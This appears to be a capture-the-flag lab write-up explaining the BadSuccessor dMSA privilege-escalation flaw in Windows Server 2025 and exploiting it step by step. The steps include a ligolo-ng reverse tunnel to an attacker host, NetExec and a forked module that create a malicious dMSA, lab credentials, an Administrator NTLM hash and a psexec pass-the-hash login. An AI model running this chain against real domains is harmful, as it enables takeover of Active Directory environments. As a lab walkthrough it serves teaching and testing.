
It abuses the dMSA migration feature introduced in Windows Server 2025. When a legacy service account is “migrated” to a dMSA, the dMSA is linked to its predecessor via the `msDS-ManagedAccountPrecededByLink` attribute, and the KDC issues tickets for the dMSA containing the full authorization context (group memberships and SIDs) of the original account. This is done so that a freshly migrated dMSA can seamlessly take over wherever the old account was used.

The flaw is that the KDC never verifies that the migration was actually authorized. It trusts the link attribute at face value. As a result, any principal with CreateChild rights for `msDS-DelegatedManagedServiceAccount` objects on any OU (a permission that is not normally considered privileged) can create a dMSA, set its `msDS-ManagedAccountPrecededByLink` to point at a high-value target like Administrator, and request a TGT. The resulting ticket’s PAC contains Domain Admin group membership.

## How to Exploit

To exploit Bad Successor, I’ll:

1. Create a dMSA in `OU=STAFF`.
2. Set two attributes:
	- `msDS-ManagedAccountPrecededByLink` → DN of the target (e.g. CN=Administrator,CN=Users,DC=eighteen,DC=htb)
	- `msDS-DelegatedMSAState` → 2 (marks the migration as “complete”)
3. Request a TGT for the dMSA using a special `KERB-DMSA-KEY-PACKAGE` structure, and the resulting ticket will have the Administrator’s groups.

There are a couple ways to do this in practice:

- Much of it can be done in PowerShell, but it’s relatively complex.
- There’s a tool called [SharpSuccessor](https://github.com/logangoins/SharpSuccessor) that will create the dMSA and make the malicious link (steps 1 and 2 above), where I could then use [Rubeus](https://github.com/GhostPack/Rubeus) to get a TGT with the Administrator groups. This does suffer from a challenge similar to the double hop problem over WinRM.
- I can create a tunnel back to my host and use [NetExec](https://www.netexec.wiki/) and [Impacket](https://github.com/SecureAuthCorp/impacket) tools.

## Checking for Bad Successor 

1. Download the .ps1 script from Akamai onto the target system and run it.

```
.\Get-BadSuccessorOUPermissions.ps1

Identity    OUs
--------    ---
EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
```

It revealed which groups have rights for any OU.

2. Check if the current user is part of the group

```
whoami /groups
```

If he is part of the Group "IT" we can abuse it!

The next step is to port forward using ligolo-ng.

4. Upload ligolo-ng binary onto target system.

```
upload agent.exe
```

5. Start up ligolo ng proxy on local machine

```
ip tuntap add user saitama mode tun ligolo && ip link set ligolo up && ligolo-proxy -selfcert
```

6. Call reverse connection to proxy from target system.

```
./agent -connect 10.10.15.9:11601 -ignore-cert
```

7. Start tunneling

```
start --tun ligolo
```

7. Add Route to "magic IP"

```
ip route add 240.0.0.1/32 dev ligolo
```

8. Check if BadSuccessor works using nxc

```
nxc ldap 240.0.0.1 -u adam.scott -p iloveyou1 -M badsuccessor
LDAP        240.0.0.1       389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        240.0.0.1       389    DC01             [+] eighteen.htb\adam.scott:iloveyou1 
BADSUCCE... 240.0.0.1       389    DC01             [+] Found domain controller with operating system Windows Server 2025: 10.129.17.132 (DC01.eighteen.htb)
BADSUCCE... 240.0.0.1       389    DC01             [+] Found 1 results
BADSUCCE... 240.0.0.1       389    DC01             IT (S-1-5-21-1152179935-589108180-1989892463-1604), OU=Staff,DC=eighteen,DC=htb
```

9. Download "uv" tool.

```
curl --proto '=https' --tlsv1.2 -LsSf https://releases.astral.sh/github/uv/releases/download/0.11.21/uv-installer.sh | sh
```

10. Adjust date/time for DC

```
sudo systemctl restart systemd-timesyncd.service ; sudo timedatectl set-ntp no ; sudo ntpdate -u 240.0.0.1
```

11. Install Custom nxc fork with bad successor

```
uv tool install git+https://github.com/azoxlpf/NetExec.git@feat/refactor-badsuccessor
```

12. Run the badsuccessor module in nxc

I used the nxc version which got installed/forked with "uv" not my normal nxc binary.

```
/root/.local/share/uv/tools/netexec/bin/nxc ldap 240.0.0.1 -u 'adam.scott' -p 'iloveyou1' -M badsuccessor --options
```

13. Run the command

```
/root/.local/share/uv/tools/netexec/bin/nxc ldap 240.0.0.1 -u adam.scott -p iloveyou1 -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb'
```

This now conducted the attack and created at an DNS Hostname and requested the TGT of the Administrator User and provided us with his NTLM Hash.

14. Login As Administrator

```
impacket-psexec Administrator@240.0.0.1 -hashes 8f81922120a7a37264098b8b5b607cdf:0b133be956bfaddf9cea56701affddec
```

